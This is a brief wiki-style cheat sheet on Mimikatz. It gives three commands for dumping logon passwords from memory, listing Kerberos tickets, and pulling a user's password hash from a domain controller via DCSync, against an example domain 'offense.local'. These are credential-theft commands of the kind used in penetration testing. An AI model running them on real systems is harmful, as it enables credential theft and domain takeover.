<!-- TITLE: Mimikatz -->
<!-- SUBTITLE: A quick summary of Mimikatz -->

# Dumping passwords

## not sure where this pulls from
```
mimikatz # sekurlsa::logonpasswords
```

## What tickets are present
```
mimikatz # sekurlsa::tickets
```

## LSADump
Fetch a hash from DC for spotless
```
mimikatz # lsadump::dcsync /domain:offense.local /user:spotless
```

